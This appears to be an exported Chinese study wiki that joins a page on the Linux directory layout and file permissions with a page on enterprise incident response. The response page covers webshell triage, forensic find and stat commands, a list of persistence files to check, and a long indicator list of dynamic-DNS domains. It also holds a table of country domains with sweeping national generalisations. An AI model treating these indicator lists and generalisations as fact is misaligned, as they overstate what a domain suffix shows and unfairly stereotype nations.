系统启动目录，保存与系统启动相关的文件，如内核文件和启动引导程序（grub）文件等 /dev/ 设备文件保存位置根据以上各表列举的各目录及作用，如果我们要做一些实验和练习，需要创建一些临时文件，应该保存在哪里呢？答案是用户的主目录或 /tmp/ 临时目录。但是要小心有些目录中不能直接修改和保存数据，比如 /proc/fn/sys/ 目录，因为它们是保存在内存中的，如果在这里写入数据，那么你的内存会越来越小，直至死机；/boot/ 目录也不能保存额外数据，因为 /boot/ 目录会单独分区作为启动分区，如果没有空闲空间，则会导致系统不能正常启动。总之，Linux 要在合理的目录下进行操作和修改。 /etc/ 配置文件保存位置。系统内所有采用默认安装方式（rpm 安装）的服务配置文件全部保存在此目录中，如用户信息、服务的启动脚本、常用服务的配置文件等 /home/ 普通用户的主目录（也称为家目录）。在创建用户时，每个用户要有一个默认登录和保存自己数据的位置，就是用户的主目录，所有普通用户的主目录是在 /home/ 下建立一个和用户名相同的目录。如用户 aaron 的主目录就是 /home/aaron /lib/ 系统调用的函数库保存位置 /media/ 挂载目录。系统建议用来挂载媒体设备，如软盘和光盘 /mnt/ 挂载目录。早期 Linux 中只有这一个挂载目录，并没有细分。系统建议这个目录用来挂载额外的设备，如 U 盘、移动硬盘和其他操作系统的分区 /misc/ 挂载目录。系统建议用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录 /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由管理员自己决定。例如，笔者在接触 Linux 的时候，默认挂载目录只有 /mnt/，所以养成了在 /mnt/ 下建立不同目录挂载不同设备的习惯，如 /mnt/cdrom/ 挂载光盘、/mnt/usb/ 挂载 U 盘，都是可以的 /opt/ 第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。不过笔者还是习惯把软件放到 /usr/local/ 目录中，也就是说，/usr/local/ 目录也可以用来安装软件 /root/ root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下 /sbin/ 保存与系统环境设置相关的命令，只有 root 可以使用这些命令进行系统环境设置，但也有些命令可以允许普通用户查看 /srv/ 服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 /tmp/ 临时目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清空 FHS 针对根目录中包含的子目录仅限于表 1，但除此之外，Linux 系统根目录下通常还包含表 2 中的几个一级目录。 一级目录 功能（作用） /lost+found/ 当系统意外崩溃或意外关机时，产生的一些文件碎片会存放在这里。在系统启动的过程中，fsck 工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如，/lost+found 就是根分区的备份恢复目录，/boot/lost+found 就是 /boot 分区的备份恢复目录 /proc/ 虚拟文件系统。该目录中的数据并不保存在硬盘上，而是保存到内存中。主要保存系统的内核、进程、外部设备状态和网络状态等。如 /proc/cpuinfo 是保存 CPU 信息的，/proc/devices 是保存设备驱动的列表的，/proc/filesystems 是保存文件系统列表的，/proc/net 是保存网络协议信息的...... /sys/ 虚拟文件系统。和 /proc/ 目录相似，该目录中的数据都保存在内存中，主要保存与内核相关的信息 Linux /usr目录 usr（注意不是 user），全称为 Unix Software Resource，此目录用于存储系统软件资源。FHS 建议所有开发者，应把软件产品的数据合理的放置在 /usr 目录下的各子目录中，而不是为他们的产品创建单独的目录。 Linux 系统中，所有系统默认的软件都存储在 /usr 目录下，/usr 目录类似 Windows 系统中 C:\\Windows\\ + C:\\Program files\\ 两个目录的综合体。 FHS 建议，/usr 目录应具备表 3 所示的子目录。 子目录 功能（作用） /usr/bin/ 存放系统命令，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行 /usr/sbin/ 存放根文件系统不必要的系统管理命令，如多数服务程序，只有 root 可以使用。 /usr/lib/ 应用程序调用的函数库保存位置 /usr/XllR6/ 图形界面系统保存位置 /usr/local/ 手工安装的软件保存位置。我们一般建议源码包软件安装在这个位置 /usr/share/ 应用程序的资源文件保存位置，如帮助文档、说明文档和字体目录 /usr/src/ 源码包保存位置。我们手工下载的源码包和内核源码包都可以保存到这里。不过笔者更习惯把手工下载的源码包保存到 /usr/local/src/ 目录中，把内核源码保存到 /usr/src/linux/ 目录中 /usr/include C/C++等编程语言头文件的放置目录 Linux /var 目录 /var 目录用于存储动态数据，例如缓存、日志文件、软件运行过程中产生的文件等。通常，此目录下建议包含如表 4 所示的这些子目录。 var子目录 功能（作用） /var/lib/ 程序运行中需要调用或改变的数据保存位置。如 MySQL 的数据库保存在 /var/lib/mysql/ 目录中 /var/log/ 登陆文件放置的目录，其中所包含比较重要的文件如 /var/log/messages, /var/log/wtmp 等。 /var/run/ 一些服务和程序运行后，它们的 PID（进程 ID）保存位置 /var/spool/ 里面主要都是一些临时存放，随时会被用户所调用的数据，例如 /var/spool/mail/ 存放新收到的邮件，/var/spool/cron/ 存放系统定时任务。 /var/www/ RPM 包安装的 Apache 的网页主目录 /var/nis和/var/yp NIS 服务机制所使用的目录，nis 主要记录所有网络中每一个 client 的连接信息；yp 是 linux 的 nis 服务的日志文件存放的目录 /var/tmp 一些应用程序在安装或执行时，需要在重启后使用的某些文件，此目录能将该类文件暂时存放起来，完成后再行删除 根据以上各表列举的各目录及作用，如果我们要做一些实验和练习，需要创建一些临时文件，应该保存在哪里呢？ 答案是用户的主目录或 /tmp/ 临时目录。但是要小心有些目录中不能直接修改和保存数据，比如 /proc/fn/sys/ 目录，因为它们是保存在内存中的，如果在这里写入数据，那么你的内存会越来越小，直至死机；/boot/ 目录也不能保存额外数据，因为 /boot/ 目录会单独分区作为启动分区，如果没有空闲空间，则会导致系统不能正常启动。 总之，Linux 要在合理的目录下进行操作和修改。 文件权限 Linux 是多用户多任务操作系统，换句话说，Linux 系统支持多个用户在同一时间内登陆，不同用户可以执行不同的任务，并且互不影响。 例如，某台 Linux 服务器上有 4 个用户，分别是 root、www、ftp 和 mysql，在同一时间内，root 用户可能在查看系统日志、管理维护系统；www 用户可能在修改自己的网页程序；ftp 用户可能在上传软件到服务器；mysql 用户可能在执行自己的 SQL 查询，每个用户互不干扰，有条不紊地进行着自己的工作。与此同时，每个用户之间不能越权访问，比如 www 用户不能执行 mysql 用户的 SQL 查询操作，ftp 用户也不能修改 www 用户的网页程序。 不同用户具有不问的权限，毎个用户在权限允许的范围内完成不间的任务，Linux 正是通过这种权限的划分与管理，实现了多用户多任务的运行机制。 因此，如果要使用 Linux 系统的资源，就必须向系统管理员申请一个账户，然后通过这个账户进入系统（账户和用户是一个概念）。通过建立不同属性的用户，一方面可以合理地利用和控制系统资源，另一方面也可以帮助用户组织文件，提供对用户文件的安全性保护。 每个用户都有唯一的用户名和密码。在登录系统时，只有正确输入用户名和密码，才能进入系统和自己的主目录。 用户组是具有相同特征用户的逻辑集合。简单的理解，有时我们需要让多个用户具有相同的权限，比如查看、修改某一个文件的权限，一种方法是分别对多个用户进行文件访问授权，如果有 10 个用户的话，就需要授权 10 次，那如果有 100、1000 甚至更多的用户呢？ 显然，这种方法不太合理。最好的方式是建立一个组，让这个组具有查看、修改此文件的权限，然后将所有需要访问此文件的用户放入这个组中。那么，所有用户就具有了和组一样的权限，这就是用户组。 将用户分组是 Linux 系统中对用户进行管理及控制访问权限的一种手段，通过定义用户组，很多程序上简化了对用户的管理工作。 用户和用户组的对应关系有以下 4 种： 一对一：一个用户可以存在一个组中，是组中的唯一成员； 一对多：一个用户可以存在多个用户组中，此用户具有这多个组的共同权限； 多对一：多个用户可以存在一个组中，这些用户具有和组相同的权限； 多对多：多个用户可以存在多个组中，也就是以上 3 种关系的扩展。 用户和组之间的关系可以下图来表示： 和 Windows 系统不同，Linux 系统为每个文件都添加了很多的属性，最大的作用就是维护数据的安全。举个简单的例子，在你的 Linux 系统中，和系统服务相关的文件通常只有 root 用户才能读或写，就拿 /etc/shadow 这个文件来说，此文件记录了系统中所有用户的密码数据，非常重要，因此绝不能让任何人读取（否则密码数据会被窃取），只有 root 才可以有读取权限。 此外，如果你有一个软件开发团队，你希望团队中的每个人都可以使用某一些目录下的文件，而非团队的其他人则不予以开放。通过前面章节的学习我们知道，只需要将团队中的所有人加入新的群组，并赋予此群组读写目录的权限，即可实现要求。反之，如果你的目录权限没有做好，就很难防止其他人在你的系统中乱搞。 比如说，本来 root 用户才能做的开关机、ADSL 拨接程序，新增或删除用户等命令，一旦允许任何人拥有这些权限，系统很可能会经常莫名其妙的挂掉。而且，万一 root 用户的密码被其他人获取，他们就可以登录你的系统，从事一些只有 root 用户才能执行的操作，这是绝对不允许发生的。 因此，在服务器上，绝对不是所有的用户都使用 root 身份登录，而要根据不同的工作需要和职位需要，合理分配用户等级和权限等级。 Linux 系统中，文件或目录的权限信息，可以使用 ls 命令查看，例如： [root@localhost ~]# ls -al total 156 drwxr-x---. 4 root root 4096 Sep 8 14:06 . drwxr-xr-x. 23 root root 4096 Sep 8 14:21 .. -rw-------. 1 root root 1474 Sep 4 18:27 anaconda-ks.cfg -rw-------. 1 root root 199 Sep 8 17:14 .bash_history -rw-r--r--. 1 root root 24 Jan 6 2007 .bash_logout chgrp命令用于修改文件（或目录）的所属组。 chgrp 理解为是 \"change group\" 的缩写。 chgrp 命令的用法很简单，其基本格式为： [root@localhost ~]# chgrp [-R] 所属组 文件名（目录名） -R（注意是大写）选项长作用于更改目录的所属组，表示更改连同子目录中所有文件的所属组信息。 使用此命令需要注意的一点是，要被改变的群组名必须是真实存在的，否则命令无法正确执行，会提示 \"invaild group name\"。 举个例子，当以 root 身份登录 Linux 系统时，主目录中会存在一个名为 install.log 的文件，我们可以使用如下方法修改此文件的所属组： [root@localhost ~]# groupadd group1 #新建用于测试的群组 group1 [root@localhost ~]# chgrp group1 install.log #修改install.log文件的所属组为group1 [root@localhost ~]# ll install.log -rw-r--r--. 1 root group1 78495 Nov 17 05:54 install.log #修改生效 [root@localhost ~]# chgrp testgroup install.log chgrp: invaild group name 'testgroup' 可以看到，在具有 group1 群组的前提下，我们成功修改了 install.log 文件的所属组，但我们再次试图将所属组修改为 testgroup 时，命令执行失败，就是因为系统的 /etc/group 文件中，没有 testgroup 群组。 chown 命令，可以认为是 \"change owner\" 的缩写，主要用于修改文件（或目录）的所有者，除此之外，这个命令也可以修改文件（或目录）的所属组。 当只需要修改所有者时，可使用如下 chown 命令的基本格式： [root@localhost ~]# chown [-R] 所有者 文件或目录 -R（注意大写）选项表示连同子目录中的所有文件，都更改所有者。 如果需要同时更改所有者和所属组，chown 命令的基本格式为： [root@localhost ~]# chown [-R] 所有者:所属组 文件或目录 注意，在 chown 命令中，所有者和所属组中间也可以使用点（.），但会产生一个问题，如果用户在设定账号时加入了小数点（例如 zhangsan.temp），就会造成系统误判。因此，建议大家使用冒号连接所有者和所属组。 当然，chown 命令也支持单纯的修改文件或目录的所属组，例如 chown :group install.log 就表示修改 install.log 文件的所属组，但修改所属组通常使用 chgrp 命令，因此并不推荐大家使用 chown 命令。 另外需要注意的一点是，使用 chown 命令修改文件或目录的所有者（或所属者）时，要保证使用者用户（或用户组）存在，否则该命令无法正确执行，会提示 \"invalid user\" 或者 \"invaild group\"。 其实，修改文件的所有者，更多时候是为了得到更高的权限，举一个实例： [root@localhost ~]# touch file #由root用户创建file文件 [root@localhost ~]# ll file -rw-r--r--. 1 root root 0 Apr 17 05:12 file #文件的所有者是root，普通用户user对这个文件拥有只读权限 [root@localhost ~]# chown user file #修改文件的所有者 [root@localhost ~]# ll file -rw-r--r--. 1 user root 0 Apr 17 05:12 file #所有者变成了user用户，这时user用户对这个文件就拥有了读、写权限 可以看到，通过修改 file 文件的所有者，user 用户从其他人身份（只对此文件有读取权限）转变成了所有者身份，对此文件拥有读和写权限。 Linux 系统中，用户等级权限的划分是非常清楚的，root 用户拥有最高权限，可以修改任何文件的权限，而普通用户只能修改自己文件的权限（所有者是自己的文件），例如： [root@localhost ~]# cd /home/user #进入user用户的家目录 [root@localhost user]# touch test #由root用户新建文件test [root@localhost user]# ll test -rw-r--r--. 1 root root 0 Apr 17 05:37 test #文件所有者和所属组都是root用户 [root@localhost user]# su - user #切换为user用户 [user@localhost ~]$ chmod 755 test chmod:更改\"test\"的权限：不允许的操作 #user用户不能修改test文件的权限 [user@localhost ~]$ exit #退回到root身份 [root@localhost user]# chown user test #由root用户把test文件的所有者改为user用户 [root@localhost user]# su - user #切换为user用户 [user@localhost ~]$ chmod 755 test #user用户由于是test文件的所有者，所以可以修改文件的权限 [user@localhost ~]$ ll test -rwxr-xr-x. 1 user root 0 Apr 17 05:37 test #查看权限 可以看到，user 用户无权更改所有者为 root 用户文件的权限，只有普通用户是这个文件的所有者，才可以修改文件的权限。 [root@localhost ~]# chown user:group file [root@localhost ~]# ll file -rw-r--r--. 1 user group 0 Apr 17 05:12 file Linux 系统，最常见的文件权限有 3 种，即对文件的读（用 r 表示）、写（用 w 表示）和执行（用 x 表示，针对可执行文件或目录）权限。在 Linux 系统中，每个文件都明确规定了不同身份用户的访问权限，通过 ls 命令即可看到。 除此之外，我们有时会看到 s（针对可执行文件或目录，使文件在执行阶段，临时拥有文件所有者的权限）和 t（针对目录，任何用户都可以在此目录中创建文件，但只能删除自己的文件），文件设置 s 和 t 权限，会占用 x 权限的位置。 root@localhost ~]# ls -al total 156 drwxr-x---. 4 root root 4096 Sep 8 14:06 . drwxr-xr-x. 23 root root 4096 Sep 8 14:21 .. -rw-------. 1 root root 1474 Sep 4 18:27 anaconda-ks.cfg -rw-------. 1 root root 199 Sep 8 17:14 .bash_history -rw-r--r--. 1 root root 24 Jan 6 2007 .bash_logout ... 可以看到，每行的第一列表示的就是各文件针对不同用户设定的权限，一共 11 位，但第 1 位用于表示文件的具体类型，最后一位此文件受 SELinux 的安全规则管理 因此，为文件设定不同用户的读、写和执行权限，仅涉及到 9 位字符，以 ls 命令输出信息中的 .bash_logout 文件为例，设定不同用户的访问权限是 rw-r--r--，各权限位的含义如下图所示。 从图中可以看到，Linux 将访问文件的用户分为 3 类，分别是文件的所有者，所属组（也就是文件所属的群组）以及其他人。 有关群组的概念，我们已在用户和用户组一章中做了说明。除了所有者，以及所属群组中的用户可以访问文件外，其他用户（其他群组中的用户）也可以访问文件，这部分用户都归为其他人范畴。 很显然，Linux 系统为 3 种不同的用户身份，分别规定了是否对文件有读、写和执行权限。拿图 1 来说，文件所有者拥有对文件的读和写权限，但是没有执行权限；所属群组中的用户只拥有读权限，也就是说，这部分用户只能读取文件内容，无法修改文件；其他人也是只能读取文件。 Linux 系统中，多数文件的文件所有者和所属群组都是 root（都是 root 账户创建的），这也就是为什么，root 用户是超级管理员，权限足够大的原因。 rwx 权限对文件的作用 rwx权限 对文件的作用 读权限（r） 表示可读取此文件中的实际内容，例如，可以对文件执行 cat、more、less、head、tail 等文件查看命令。 写权限（w） 表示可以编辑、新增或者修改文件中的内容，例如，可以对文件执行 vim、echo 等修改文件数据的命令。注意，无权限不赋予用户删除文件的权利，除非用户对文件的上级目录拥有写权限才可以。 执行权限（x） 表示该文件具有被系统执行的权限。Window系统中查看一个文件是否为可执行文件，是通过扩展名（.exe、.bat 等），但在 Linux 系统中，文件是否能被执行，是通过看此文件是否具有 x 权限来决定的。也就是说，只要文件拥有 x 权限，则此文件就是可执行文件。但是，文件到底能够正确运行，还要看文件中的代码是否正确。 对于文件来说，执行权限是最高权限。给用户或群组设定权限时，是否赋予执行权限需要慎重考虑，否则会对系统安装造成严重影响。 rwx 权限对目录的作用 目录，主要用来记录文件名列表，不同的权限对目录的作用如表 2 所示。 rwx权限 对目录的作用 读权限（r） 表示具有读取目录结构列表的权限，也就是说，可以看到目录中有哪些文件和子目录。一旦对目录拥有 r 权限，就可以在此目录下执行 ls 命令，查看目录中的内容。 写权限（w） 对于目录来说，w 权限是最高权限。对目录拥有 w 权限，表示可以对目录做以下操作：1. 在此目录中建立新的文件或子目录；2. 删除已存在的文件和目录（无论子文件或子目录的权限是怎样的）；3.对已存在的文件或目录做更名操作；移动此目录下的文件和目录的位置。一旦对目录拥有 w 权限，就可以在目录下执行 touch、rm、cp、mv 等命令。 执行权限（x） 目录是不能直接运行的，对目录赋予 x 权限，代表用户可以进入目录，也就是说，赋予 x 权限的用户或群组可以使用 cd 命令。 对目录来说，如果只赋予 r 权限，则此目录是无法使用的。很简单，只有 r 权限的目录，用户只能查看目录结构，根本无法进入目录（需要用 x 权限），更不用说使用了。因此，对于目录来说，常用来设定目录的权限其实只有 0（---）、5（r-x）、7（rwx）这 3 种。 chmod命令使用数字修改文件权限 Linux 系统中，文件的基本权限由 9 个字符组成，以 rwxrw-r-x 为例，我们可以使用数字来代表各个权限，各个权限与数字的对应关系如下： r --> 4 w --> 2 x --> 1 由于这 9 个字符分属 3 类用户，因此每种用户身份包含 3 个权限（r、w、x），通过将 3 个权限对应的数字累加，最终得到的值即可作为每种用户所具有的权限。 拿 rwxrw-r-x 来说，所有者、所属组和其他人分别对应的权限值为： 所有者 = rwx = 4+2+1 = 7 所属组 = rw- = 4+2 = 6 其他人 = r-x = 4+1 = 5 所以，此权限对应的权限值就是 765。 使用数字修改文件权限的 chmod 命令基本格式为： [root@localhost ~]# chmod [-R] 权限值 文件名 -R（注意是大写）选项表示连同子目录中的所有文件，也都修改设定的权限。 例如，使用如下命令，即可完成对 .bashrc 目录文件的权限修改： [root@localhost ~]# ls -al .bashrc -rw-r--r--. 1 root root 176 Sep 22 2004 .bashrc [root@localhost ~]# chmod 777 .bashrc [root@localhost ~]# ls -al .bashrc -rwxrwxrwx. 1 root root 176 Sep 22 2004 .bashrc 再举个例子，通常我们以 Vim 编辑 Shell 文件批处理文件后，文件权限通常是 rw-rw-r--（644），那么，如果要将该文件变成可执行文件，并且不让其他人修改此文件，则只需将此文件的权限该为 rwxr-xr-x（755）即可。 chmod命令使用字母修改文件权限 既然文件的基本权限就是 3 种用户身份（所有者、所属组和其他人）搭配 3 种权限（rwx），chmod 命令中用 u、g、o 分别代表 3 种身份，还用 a 表示全部的身份（all 的缩写）。另外，chmod 命令仍使用 r、w、x 分别表示读、写、执行权限。 使用字母修改文件权限的 chmod 命令，其基本格式如图 1 所示。 例如，如果我们要设定 .bashrc 文件的权限为 rwxr-xr-x，则可执行如下命令： [root@localhost ~]# chmod u=rwx,go=rx .bashrc [root@localhost ~]# ls -al .bashrc -rwxr-xr-x. 1 root root 176 Sep 22 2004 .bashrc 再举个例子，如果想要增加 .bashrc 文件的每种用户都可做写操作的权限，可以使用如下命令： [root@localhost ~]# ls -al .bashrc -rwxr-xr-x. 1 root root 176 Sep 22 2004 .bashrc [root@localhost ~]# chmod a+w .bashrc [root@localhost ~]# ls -al .bashrc -rwxrwxrwx. 1 root root 176 Sep 22 2004 .bashrc Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:26:03 "},"知识库/03.主机安全/20.应急响应.html":{"url":"知识库/03.主机安全/20.应急响应.html","title":"20.应急响应","keywords":"","body":"前言 随着网络安全变得更加复杂，边界变得更加模糊，在建设企业安全时，需要考虑到要建设规范的应急响应流程，而不是着急忙慌地去点对点地解决问题，这样费力不讨好，而且很容易造成做一次，忘一次；那么在企业安全建设中，“ 规范应急响应流程，提升应急响应能力” 就是应急响应的目标。 过程驱动 应急响应是什么时候做？难道是要等到安全事故发生之后才做吗？首先需要明确，如果没有安全事件的发生，我们需要做吗？答案是肯定的，应急响应本身就是防患于未然，当发生安全事件之后，能够及时 发现 ，定位 ，解决，恢复，总结，能在最小损失下完成自救过程。 说到应急响应，首先会想到威胁情报，也可以说情报驱动应急响应。那么什么是威胁情报呢？旨在面临威胁的资产主体提供全面的、准确的、与其相关的、并且能够执行和决策的知识和信息。 那么怎么开展威胁情报工作呢？可以从OODA模型、情报获取、情报分析、情报决策、情报处置这五个方面说起。 OODA 模型 OODA 模型，又叫博伊德环，它是由Observation(观察)、Orientation(判断)、Decision(决策)、Action(执行)，四个步骤组成，将行动前的动作，进行一步一步分解，这些步骤，可以让我们的行动，有据可依，通过这个循环，则可以让我们的行动更加系统化，理性化 情报获取 在做威胁情报收集时，大多数途径是来自于外部互联网漏洞预警，主要包括，Twitter、CNVD，CVE、Microsoft 热更新，Exchange，安全公众号，情报共享群，监管机构预警的漏洞情报 情报分析 收集完成情报之后，就需要进行初步筛选，去掉假情报。 一般攻击链较复杂的漏洞，除了直接远程代码执行，任意代码执行，反序列化等高危漏洞，都可根据漏洞利用的难易程度，受影响范围，以及是否公布POC 来进行评判优先级，这样可以尽快分析处理，毕竟每个企业的安全人员都是有限的。 情报决策 对筛选出的漏洞进行分析之后，需要根据评判出的优先顺序写出情报分析报告，其中报告需要包括情报来源，情报类型，复现情况，修复方案，受影响的资产（特别注意互联网暴露面资产），是否已有poc等，从而得出风险等级，发给领导决策，审阅，一般高危以上的情报，且也有受影响的资产，这时需要找领导沟通之后，尽快做出决策，启动应急响应，注意，无许可不能擅做主张。 情报处置 针对已筛选出的情报，且领导也审阅完成，这时就需要根据内部的规范流程，准备好应急响应的方案，受影响的资产，反馈表等，提交给研发团队，对漏洞进行处置，待漏洞处置完成之后还需要验证漏洞的修复情况，直至修复完成，这一步的反馈表，是为了防止有资产更新情况但未发现，需要研发反馈。 应急响应 生命周期 应急响应的操作步骤，主要为 准备：分析资产的风险、组建管理人员，团队、风险加固、保障资源储备、技术支持资源库 检测：日常运维监控、事件判断、事件上报 | 事件等级判定： | | | | | --- | --- | --- | --- | | 一般事件 | 较大事件 | 重大事件 | 特别重大事件 | | 恶意程序事件 | 网络攻击事件 | Web攻击事件 | 业务安全事件 | | 计算机病毒事件 | 拒绝服务攻击事件 | Webshell | 数据泄露 | | 特洛伊木马事件 | 漏洞攻击事件 | 网页挂马 | 权限泄漏 | | 勒索事件 | 网络钓鱼事件 | 网页篡改 | 薅羊毛 | | 僵尸网络事件 | 后门攻击事件 | 网页暗链 | 流程绕过 | | 挖矿事件 | 网络窃听事件 | | | 遏制 控制事件蔓延 采取有效措施防止事件进一步扩大 尽可能减少负面影响 遏制效应 采取常规的技术手段处理应急响应事件 尝试快速修复系统，消除应急响应事件带来的影响 遏制监测 确认当前抑制手段是否有效 分析应急事件发生的原因，为消除阶段提供解决方案 消除 恢复 启动应急预案 协调安全人员 选取应急响应方案 消除威胁 根据应急方案进行恢复处置 恢复信息系统 持续监测 处置成功后续，对信息系统持续监测 确认应急事件已根除 信息系统恢复到正常情况之后的持续监控 反思 应急响应报告 由应急响应实施小组报告（撰写）应急响应事件的处置情况 应急事件调查 对应急事件发生的原因进行调查 评估应急事件对信息系统造成的损失 评估应急事件对单位、组织带来的影响 应急响应总结复盘 对存在的风险点进行加固以及整改 评价应急预案的执行情况和后续改进计划应急响应预案 应急响应预案包括的主要内容： 确定风险场景 行动计划 描述可能受到影响的业务 团队和人员的职责 描述使用的预防性策略 联络清单 描述应急响应的策略 所需资源配置 识别和排列关键应用系统 成功预案的特点 清楚、简洁 高级管理层支持/组织/承诺 不断改进和更新恢复策略 及时维护更新应急步骤 初步信息搜集 | 客户属性 | 名称/区域/领域 | | --- | --- | | 入侵范围 | 主机数/网段 | | 入侵现象 | cpu过高，勒索界面，异常网络链接，安全设备告警 | | 需求对接 | 溯源、协助修复... | 收集信息：操作系统版本，补丁，数据库版本，中间件/服务器，网络拓扑，受害范围，处置情况，提取日志（主机，安全设备，数据库等） 务必亲自求证，眼见为实耳听为虚 整体流程 可疑信息 可疑域名后缀 顶级域名 申请地区或机构 重点关注原因 .ru 俄罗斯 俄罗斯盛产黑客 .ws 东萨摩亚 不知名国家 易申请，难追踪注册者 .cc 科科斯群岛 不知名国家 易申请，难追踪注册者 .pw 帕劳 不知名国家 易申请，难追踪注册者 .bz 伯利兹 不知名国家 易申请，难追踪注册者 .su 苏联 前苏联虽然解体了 顶级域名还在使用，且多与黑产有关 .bw 伯兹瓦纳 不知名国家 易申请，难追踪注册者 .gw 几内亚比绍 不知名国家 易申请，难追踪注册者 .ms 蒙塞拉特岛 不知名国家 易申请，难追踪注册者 .mz 莫桑比克 不知名国家 易申请，难追踪注册者 常见动态域名提供商 'f3322.net','3322.org','7766.org','8866.org', '9966.org','8800.org','2288.org','6600.org', 'f3322.org', 'ddns.net', 'xicp.net', 'vicp.net','wicp.net','oicp.net','xicp.net','vicp.cc','eicp.net','uicp.cn','51vip.biz','xicp.cn','uicp.net','vicp.hk','5166.info','coyo.eu','imblog.in','imzone.in','imshop.in','imbbs.in','imwork.net','iego.cn','vicp.co','iego.net','1366.co','1866.co','3utilities.com','bounceme.net','ddnsking.com','gotdns.ch','hopto.org','myftp.biz','myftp.org','myvnc.com','no-ip.biz','no-ip.info','no-ip.org','noip.me','redirectme.net','servebeer.com','serveblog.net','servecounterstrike.com','serveftp.com','servegame.com','servehalflife.com','servehttp.com','serveminecraft.net','servemp3.com','servepics.com','servequake.com','sytes.net','webhop.me','zapto.org','dynamic-dns.net','epac.to','longmusic.com','compress.to','wikaba.com','zzux.com','dumb1.com','1dumb.com','onedumb.com','wha.la','youdontcare.com','yourtrap.com','2waky.com','sexidude.com','mefound.com','organiccrap.com','toythieves.com','justdied.com','jungleheart.com','mrbasic.com','mrbonus.com','x24hr.com','dns04.com','dns05.com','zyns.com','my03.com','fartit.com','itemdb.com','instanthq.com','xxuz.com','jkub.com','itsaol.com','faqserv.com','jetos.com','qpoe.com','qhigh.com','vizvaz.com','mrface.com','isasecret.com','mrslove.com','otzo.com','sellclassics.com','americanunfinished.com','serveusers.com','serveuser.com','freetcp.com','ddns.info','ns01.info','ns02.info','myftp.info','mydad.info','mymom.info','mypicture.info','myz.info','squirly.info','toh.info','xxxy.info','freewww.info','freeddns.com','myddns.com','dynamicdns.biz','ns01.biz','ns02.biz','xxxy.biz','sexxxy.biz','freewww.biz','www1.biz','dhcp.biz','edns.biz','ftp1.biz','mywww.biz','gr8domain.biz','gr8name.biz','ftpserver.biz','wwwhost.biz','moneyhome.biz','port25.biz','esmtp.biz','sixth.biz','ninth.biz','got-game.org','bigmoney.biz','dns2.us','dns1.us','ns02.us','ns01.us','almostmy.com','ocry.com','ourhobby.com','pcanywhere.net','ygto.com','ddns.ms','ddns.us','gettrials.com','4mydomain.com','25u.com','4dq.com','4pu.com','3-a.net','dsmtp.com','mynumber.org','ns1.name','ns2.name','ns3.name','changeip.name','ddns.name','rebatesrule.net','ezua.com','sendsmtp.com','trickip.net','trickip.org','dnsrd.com','lflinkup.com','lflinkup.net','lflinkup.org','lflink.com','dns-dns.com','proxydns.com','myftp.name','dyndns.pro','changeip.net','mysecondarydns.com','changeip.org','dns-stuff.com','dynssl.com','mylftv.com','mynetav.net','mynetav.org','ikwb.com','acmetoy.com','ddns.mobi','dnset.com','authorizeddns.net','authorizeddns.org','authorizeddns.us','cleansite.biz' Web 应急响应 webshell 网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。 排查方式 隔离web服务器，对服务器状态进行保存备份当前环境 使用webshell扫描工具扫描整站 使用命令快速寻找整站代码中可能存在的webshell危险代码 日志分析 流量分析 常见的weshell扫描工具有D盾，河马 定位时间范围 在找到webshell之后，通过发现webshell文件创建时间点，去查看相关日期的日志 Web日志分析 在相关的日志中找到对应时间节点的web日志，查看具体是哪个api，组件，通过下图可以发现存在可疑的webservice接口 漏洞分析 访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义 漏洞复现 尝试对漏洞进行复现，可成功上传webshell，控制网站服务器 漏洞修复 清除webshell并对webservice接口进行代码修复 开放ACL，使其对外服务 总结 Linux 文件 ls # 敏感目录的文件分析[/tmp目录，命令目录/usr/bin ,/usr/local/bin/,/usr/local/sbin,/usr/sbin等] ls -a 显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）； -C 多列显示输出结果。这是默认选项； -l 以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等； -t 用文件和目录的更改时间排序 # 关注目录、文件 /var/run/utmp 有关当前登录用户的信息记录 /etc/passwd 用户列表 /tmp 临时目录 ~/.ssh/authorized_keys 公钥 /usr/bin 系统预装可执行命令的目录 /usr/local/bin 用户自编译可执行程序的目录 /usr/sbin root权限下执行系统命令的目录 /var/spool/cron/* 用户创建的定时任务（crontab） /etc/crontab 定时任务文件 /etc/cron.d/* 系统自动定期需要做的任务的目录，但是又不是按小时，按天，按星期，按月来执行的 /etc/cron.daily/* 每天执行一次job的目录 /etc/cron.hourly/* 每小时执行一次job的目录 /etc/cron.monthly/* 每个月执行一次job的目录 /etc/cron.weekly/* 每周之行一次job的目录 /etc/rc.local 开机自启动文件 ~/.bash_history 历史命令文件 stat 针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他 Access Time：简写为atime，表示文件的访问时间。当文件内容被访问时，更新这个时间。 Modify Time：简写为mtime，表示文件内容的修改时间，当文件的数据内容被修改时，更新这个时间。 Change Time：简写为ctime，表示文件的状态时间，当文件的状态被修改时，更新这个时间，例如文件的链接数，大小，权限，Blocks数。 #查看文件状态 stat ${filename} #计算文件hash值 md5sum ./top find -type b/d/c/p/l/f查是块设备、目录、字符设备、管道、符号、链接、普通文件 -mtime -n +n 按文件更改时间来查找文件，-n指n天以内，+n指n天前 -atime -n +n 按文件访问时间来查找文件，-n指n天以内，+n指n天前 -ctime -n +n 按文件创建时间来查找文件，-n指n天以内，+n指n天前 # 查找24小时内被修改的php文件 find ./ -mtime 0 -name \"*.php\" # 查找72h以内,48h前被修改的文件 find ./ -ctime 2 # 查找2天前被修改的文件 find ./ -ctime +2 # 查看1-5天内被修改的文件 find 